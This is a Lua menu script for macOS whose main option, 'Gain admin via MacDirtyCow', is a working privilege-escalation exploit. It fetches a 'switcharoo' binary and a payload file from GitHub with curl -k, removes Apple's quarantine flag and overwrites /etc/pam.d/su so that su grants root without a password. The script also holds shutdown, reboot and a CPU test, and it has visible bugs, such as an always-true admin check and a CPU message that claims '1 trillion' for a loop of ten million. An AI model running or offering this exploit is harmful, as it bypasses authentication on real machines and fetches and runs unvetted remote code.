#!/usr/bin/env lua

-- pre-functions
print("Defining preliminary functions")
function os.capture(cmd, raw)
  local f = assert(io.popen(cmd, 'r'))
  local s = assert(f:read('*a'))
  f:close()
  if raw then return s end
  s = string.gsub(s, '^%s+', '')
  s = string.gsub(s, '%s+$', '')
  s = string.gsub(s, '[\n\r]+', ' ')
  return s
end

function os.sleep(n)
  local t = os.clock()
  io.write("\n")
  io.write("\27[A")
  while os.clock() - t < n do end
end

print("Defining variables and running preperation functions")
-- dependency check
print("Making sure luafilesystem and luasocket are installed")
if not string.find(os.capture("luarocks list"), "luafilesystem") or not string.find(os.capture("luarocks list"), "luasocket") then
  os.execute("luarocks install luafilesystem && luarocks install luasocket")
end


-- variables // do not touch
local shell = os.getenv("SHELL")
local http = require("socket.http")
local homedir = os.getenv("HOME")
local osVersion = os.capture("sw_vers -productVersion")
local osBuildVer = os.capture("sw_vers -buildVersion")
local scriptVersion = "v0.5.0"
local date = os.date()
local isAdmin = os.capture("id -u")
isAdmin = tonumber(isAdmin) == 0 and "yes" or "no"
if isAdmin then
  print("\n\n>>If the script errors out here, make sure to run with sudo -E /path/to/script<<\n\n\n")
end
local tempdir = os.getenv("TMPDIR")
if not io.open(tempdir.."fs/", "r") then
  os.execute("mkdir $TMPDIR/fs/")
end

if not io.open("/usr/local/bin/fs", "r") then
  os.execute("ln -s $PWD/fs.lua /usr/local/bin/fs")
end

-- function table
print("Creating function table")
local functionTable = {
  e = function()
    io.write("\27c")
    os.exit()
  end,
  s = function()
    io.write("\27c")
    io.write("Are you sure you want to shutdown? yes/no: ")
    local r = io.read()
    if tostring(r) == "yes" and isAdmin == "yes" then
      os.execute("shutdown -h NOW")
    elseif tostring(r) == "yes" and isAdmin == "no" then
      os.execute('osascript -e \'tell application "Finder"\n\tshut down\nend tell\'')
    else
      welcomeScreen()
    end
  end,
  ["1"] = function()
    io.write("\27c")
    print("Checking if macOS is exploitable...")
    local incompatibleVersions = {
      ["12.6.2"] = true,
      ["12.6.3"] = true,
      ["12.6.4"] = true,
      ["12.6.5"] = true,
      ["12.6.6"] = true,
      ["13.1"] = true,
      ["13.2"] = true,
      ["13.2.1"] = true,
      ["13.3"] = true,
      ["13.3.1"] = true,
      ["13.4"] = true,
      ["13.5"] = true,
      ["14.0"] = true,
    }
    if incompatibleVersions[osVersion] then
      print("\nYour macOS is NOT exploitable by MacDirtyCow, and therefore, this function is obsolete.")
      print("\nYou may continue, but the exploit will not work.")
      io.write("Press c and enter to continue, or any key and enter to exit: ")
      local r = io.read()
      if r ~= "c" then
        welcomeScreen()
      else
      end
    else
      print("\nYour macOS is exploitable by MacDirtyCow, continuing...")
    end
    io.write("\27c")
    if not io.open(tempdir.."fs/switcharoo", "r") and io.open(tempdir.."fs/switcharoo", "r") then
      io.write("--> Download switcharoo")
      os.sleep(2)
      os.execute("curl -k https://raw.githubusercontent.com/Thyssenkrupp234/ra1nm8/main/resources/exploit/switcharoo > "..tempdir.."fs/switcharoo 2>/dev/null")
      io.write("\n--> Removing quarantine and making switcharoo executable")
      os.execute("chmod +x "..tempdir.."fs/switcharoo && xattr -rd com.apple.quarantine "..tempdir.."fs/switcharoo")
      os.sleep(1)
      io.write("\n--> Download overwrite_file.bin")
      os.sleep(2)
      os.execute("curl -k https://raw.githubusercontent.com/Thyssenkrupp234/ra1nm8/main/resources/exploit/overwrite_file.bin > "..tempdir.."fs/overwrite_file.bin 2>/dev/null")
      io.write("\nDownloaded items, executing command...\n\n")
    else
      print("--> Cached exploit files found, executing exploit...")
    end
    os.sleep(1)
    local exploitRun = os.capture(tempdir.."fs/switcharoo /etc/pam.d/su "..tempdir.."fs/overwrite_file.bin")
    io.write("\27c")
    io.write("--> Exploit ran. To check it it worked, run su in terminal.")
    io.read()
    welcomeScreen()
  end,
  r = function()
    io.write("\27c")
    if isAdmin == "yes" then
      io.write("Script is running with elevated privilages, executing reboot command in 5 seconds...")
      os.sleep(5)
      os.execute("reboot")
    else
      io.write("Script is running non-elevated, please enter credentials if required.")
      io.write("\n\nYou will not be able to see your password being typed.")
      os.execute("sudo reboot")
    end
  end,
  ["2"] = function()
    local t = false
    local st = os.clock()
    for i=1,10000000 do end
    local et = os.clock() - st
    local sti = os.clock()
    for i=1,10000000 do
      io.write(i)
    end
    io.write("\27c")
    local eti = os.clock() - sti
    io.write("It took your CPU and the Lua 5.4 VM "..tostring(et).." seconds to iterate through 1 trillion numbers, fom 1-trillion\n\nIt took your CPU and the lua 5.4 VM "..tostring(eti).." seconds to print out all numbers between 1 and 1 trillion")
    io.read()
    welcomeScreen()
  end,
  rs = function()
    os.execute("fs")
    os.exit()
  end,
}
print("Defining welcomescreen() function")
function welcomeScreen()
  -- clear screen then print out welcome stuff
  io.write("\27c")
  io.write("\27[96mmacOS: \27[92m"..osVersion.." ("..osBuildVer..")".."\27[96m\nShell: \27[92m"..tostring(shell).."\n\27[96mScript Version: \27[92m"..scriptVersion.."\n\27[96mDate: \27[92m"..date.."\n\27[96mRunning as admin: \27[92m"..tostring(isAdmin))
  io.write("\n\27[0m\n\n1. Gain admin via MacDirtyCow\n2. Test CPU speed\nE. Exit\nS. Shut Down\nR. Reboot\nRS. Relaunch script\n\nPick an option: ")
  local response = io.read()
  if functionTable[string.lower(tostring(response))] then
    functionTable[string.lower(tostring(response))]()
  else
    welcomeScreen()
  end
end
print("Starting welcomescreen() function")
welcomeScreen()